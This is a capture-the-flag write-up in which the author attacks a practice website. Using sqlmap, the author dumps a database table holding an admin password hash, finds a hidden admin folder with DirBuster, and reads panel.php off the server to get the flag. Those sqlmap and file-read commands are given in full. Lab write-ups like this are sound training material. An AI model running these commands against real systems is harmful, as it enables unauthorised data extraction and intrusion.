# Exploration Phase #
I first started off with exploring the website and seeing what possible vulnerabilities it may have.

There are a few things that stood out to me initially:
1. "Contact me" form inputs could be possibly used for xss or injections
2. the web directory is publically viewable
3. comments left throughout the html give hints toward some vulnerabilities and other files not publicly seen. according to the comments:
	- a hint on how one of the php files work a little
	- there is "portfolio.php" that takes params "?id"

# "Contact Me" #
I tried inputing some html and js to see if it was prone to XSS, but the response is always 500 leading it to a dead end

# Web Dir #
I explored different directorys (/images, /js, /mail) but none seemed to provide enough information to be used.

# Comments #
The hints of changing the email in one of the files is no help to figuring out a vulnerability if we cant see the file.

I took a look at the `/portfolio.php?id=1` and found if id is 1-3 it will return text.

# SQL Map #
seeing that this file and parameters may be the only vulnerability, I tried SqlMap against it.

I ran `sqlmap -u ip:port/portfolio.php?id=1 --tables` to get all the schemes and tables if there are any.

It ran successfuly and fond out the database is Mysql and it was able to get multiple schemes.
Most of them were mysql config schemes but this one seemed promissing:
```
Database: freelancer
[2 tables]
+----------------------------------------------------+
| portfolio                                          |
| safeadmin                                          |
+----------------------------------------------------+
```

I wanted to take a look at `safeadmin` so I ran `sqlmap -u ip:port/portfolio?id=1 -T safeadmin` and got the following:
```
Database: freelancer
Table: safeadmin
[1 entry]
+----+--------------------------------------------------------------+----------+---------------------+
| id | password                                                     | username | created_at          |
+----+--------------------------------------------------------------+----------+---------------------+
| 1  | $2y$10$s2ZCi/tHICnA97uf4MfbZuhmOZQXdCnrM9VM9LBMHPp68vAXNRf4K | safeadm  | 2019-07-16 20:25:45 |
+----+--------------------------------------------------------------+----------+---------------------+
```

# Password #
Looking at the password imediatly I can tell they used one of PHP's `password_hash(...)` functions, depening on what they used it could be difficult to crack.

I decided to circle back to this later. Now knowing that there is a user I assumed there would be some form or login to authenticate with this user.

# OWASP Dir Buster #
I ran Dir Buster to look for more routes that I could not see immediatly. For this task I ran it with 100 threads and used the `common.txt` list located in `/usr/share/dirb/wordlists/`

letting the program run for a bit of time, it imediately found some files that I did not find on my exploration:
1. administrat folder
2. htaccess files + folders

I cut the run short and re-ran it but this time on the `/administrat` folder to see what files it has faster.
The Program found may more files in the administrat folder:
1. logout.php
2. index.php
3. panel.php

checking out the administrat page on the browser it is clearly a login for a admin user, but without the proper credentials it is useless. The logout page is only for logging out, it will not help get the flag.

# SqlMap File #
I wanted to check out the `panel.php`, knowing that the some web directories use `/var/www/html/` file, I ran `sqlmap -u ip:port/portfolio.php?id=1 --file-read="/var/www/html/administrat/panel.php"` to retrieve the file content.

checking the content of the panel.php I just extracted, I found the flag I was looking for!